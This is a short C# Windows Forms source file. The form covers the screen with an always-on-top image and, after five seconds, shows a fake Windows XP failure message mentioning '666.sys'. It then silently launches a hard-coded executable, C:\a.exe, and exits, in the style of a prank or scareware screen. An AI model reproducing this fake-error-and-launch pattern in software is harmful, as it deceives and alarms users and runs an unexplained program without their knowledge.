using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace WindowsFormsApp2
{
    public partial class Form3 : Form
    {
        public Form3()
        {
            InitializeComponent();
            // Set initial properties for pictureBox1
            pictureBox2.Dock = DockStyle.Fill;
            pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
            WindowState = FormWindowState.Maximized;

            // Set initial properties for pictureBox1
            pictureBox2.Dock = DockStyle.Fill;
            pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
            this.TopMost = true;

            timer2.Interval = 5000;
            // Start the timer
            timer2.Start();
        }

       
        private void timer2_Tick(object sender, EventArgs e)
        {

            timer2.Stop();
            MessageBox.Show($"Failed start windows XP\nLoading 666.sys", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Process.Start("C:\\a.exe");
            Application.Exit();
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {

        }
    }
}
